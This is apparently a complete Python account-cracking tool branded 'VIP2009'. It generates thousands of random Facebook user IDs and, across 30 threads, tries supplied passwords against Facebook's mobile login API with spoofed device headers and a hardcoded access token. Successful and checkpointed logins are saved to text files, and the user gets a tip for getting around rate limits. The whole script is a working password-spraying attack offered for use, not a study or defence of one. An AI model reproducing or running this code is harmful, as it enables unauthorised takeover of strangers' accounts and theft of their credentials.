W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'

import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import marshal
import zlib
import subprocess
from concurrent.futures import ThreadPoolExecutor

logo = """  \033[1;36m                                                                         
 _     _  _______  _____     ____   ____    ____    _____  
(_)   (_)(_______)(_____)  _(____) (____)  (____)  (_____) 
(_)   (_)   (_)   (_)__(_)(_) _(_)(_)  (_)(_)  (_)(_)___(_)
(_)   (_)   (_)   (_____)   _(_)  (_)  (_)(_)  (_) (_____) 
 (_)_(_)  __(_)__ (_)      (_)___ (_)__(_)(_)__(_)    (_)  
  (___)  (_______)(_)     (______) (____)  (____)    (_)   
 
 \033[1;36m       🤩︻⁕ᆕᆕᆕᆕ⸻⸻⁕⦕{\033[1;32mAUTHOR╭-> LTKYAW\033[1;36m}⦖⁕⸻⸻ᆕᆕᆕᆕ⁕︻🤩                            
\033[1;36m═══════════════════════════════════════════════════════════
\033[1;36m [\033[1;36m🌟] CONTACT   \033[1;36m->  m.me/arakanese.003
\033[1;36m [\033[1;36m🌟] NEW TOOL \033[1;36m ->  *VIP𝟚𝟘𝟘𝟡*
\033[1;36m [\033[1;36m🌟] _NOTE_    \033[1;36m->  🇩‌🇴‌🇳‌'🇹‌ 🇫‌🇴‌🇷‌🇬‌🇪‌🇹‌ 🇱‌🇹‌🇰‌🇾‌🇦‌🇼‌ 😍
\033[1;36m═══════════════════════════════════════════════════════════
    """


class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print(' \033[1;36m[✯]->👽CRACK RANDOM 2009 ACCOUNT👽<-[✯] \033[0m')
		print("")
		print("%s \033[1;36m[%s\033[1;36m1%s\033[1;36m]%s \033[1;36mCRACK \033[1;36m>> 2009 %s\033[1;36m[🤩\033[1;36m]"%(P,G,R,Y,B))
		print(" \033[1;36m[2] EXIT")
		__DOD = input("\n\033[1;36m [✯] -> CHOOSE \033[1;36m: ")
		if __DOD in ["", " "]:
			Main()
		elif __DOD in ["1", "01"]:
			self.fbtua()
		else:
			exit()

	def fbtua(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		os.system('clear');print(logo)
		limit = int(input(" \033[1;36m[*] CRACK ID LIMIT -> (20,000) -> "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[1;36m [*] TOTAL ID -> \033[1;36m%s\033[1;36m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s \033[1;36m[!] USE %s\033[1;36m, %s\033[1;36m(->,)%s "%(G,Y,B,Y))
				print("%s \033[1;36m[*] EXAMPLE : %s\033[1;36m123456,1234567"%(G,Y))
				listpass = input("%s \033[1;36m[?] ENTER PASSWORD :%s\033[1;36m "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s \033[1;36m[*] CRACK WITH PASSWORD -> [\033[1;36m%s\033[1;36m]"%(G,listpass))
				print("\n%s \033[1;36m[*] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s \033[1;36m[*] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s \033[1;36m[!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n[->] CRACK DONE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 12; Redmi K30 Build/SKQ1.210908.001;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.41 Mobile Safari/537.36;]"
		])
		sys.stdout.write(
			"\r\r\033[1;36m *-> { CRACK VIP2009 TOOL } <-* "
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[1;32m*😍*-> %s -> %s\033[1;32m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * [VIP2009]--> %s->%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[1;36m*😜*-> %s \033[1;36m-> %s\033[1;36m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("  * [VIP2009]--> %s->%s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

try:Main()
except Exception as e:exit(str(e))

